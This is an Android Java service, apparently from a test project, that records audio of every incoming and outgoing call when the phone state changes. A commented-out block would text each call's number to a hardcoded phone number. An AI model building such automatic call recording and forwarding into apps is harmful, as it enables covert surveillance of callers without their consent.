package com.example.jason.test_service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class PhoneService extends Service {
    private TelephonyManager telephonyManager = null;
    private String outgoingnumber = null;;
    private RecordAudioUtil recordAudioUtil =null;
    private Intent intent = null;
    public PhoneService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        this.telephonyManager = (TelephonyManager) super.getSystemService(Context.TELEPHONY_SERVICE);
        this.telephonyManager.listen(new PhoneStateListenerlmpl(), PhoneStateListener.LISTEN_CALL_STATE);
        Toast.makeText(this,"New Service was created",Toast.LENGTH_LONG).show();
        super.onCreate();
    }

    @SuppressWarnings("deprecation")
    @Override
    public void onStart(Intent intent, int startId) {
        this.outgoingnumber = intent.getStringExtra("outgoingnumber");
        Toast.makeText(this,"Service Started",Toast.LENGTH_SHORT).show();
        super.onStart(intent, startId);
    }
    private class PhoneStateListenerlmpl extends PhoneStateListener{
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state){
                case TelephonyManager.CALL_STATE_IDLE:
                    if (PhoneService.this.recordAudioUtil != null){
                        PhoneService.this.recordAudioUtil.stop();
                        PhoneService.this.recordAudioUtil = null;
                    }
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    PhoneService.this.recordAudioUtil = new RecordAudioUtil(incomingNumber,"incomingcall");
                    PhoneService.this.recordAudioUtil.record();
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    PhoneService.this.recordAudioUtil = new RecordAudioUtil(PhoneService.this.outgoingnumber,"outgoingcall");
                    PhoneService.this.recordAudioUtil.record();
                    break;
            }
            /*switch (state){
                case TelephonyManager.CALL_STATE_IDLE:
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    new MessageSendUtil(PhoneService.this,PhoneService.this.intent).send("1871511959",incomingNumber,"拨入");
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    new MessageSendUtil(PhoneService.this,PhoneService.this.intent).send("18721511959",outgoingnumber,"拨出");
                    break;
            }*/
            super.onCallStateChanged(state, incomingNumber);
        }
    }
    @Override
    public void onDestroy() {
        Toast.makeText(this,"Service destroyed",Toast.LENGTH_SHORT).show();
        super.onDestroy();
    }
}
